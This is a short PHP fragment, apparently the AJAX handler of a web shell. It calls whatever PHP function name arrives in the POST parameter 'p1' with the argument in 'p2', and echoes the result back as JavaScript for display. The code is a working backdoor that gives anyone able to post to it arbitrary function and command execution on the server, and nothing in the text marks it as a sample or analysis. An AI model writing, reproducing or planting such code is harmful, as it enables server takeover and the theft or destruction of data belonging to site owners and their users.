<?php
if(isset($_POST['ajax'])) { 
    $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true; 
    ob_start(); 
    if(function_exists($_POST['p1'])) 
        echo $_POST['p1']($_POST['p2']); 
    $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n"; 
    echo strlen($temp), "\n", $temp; 
    exit; 
} 
?>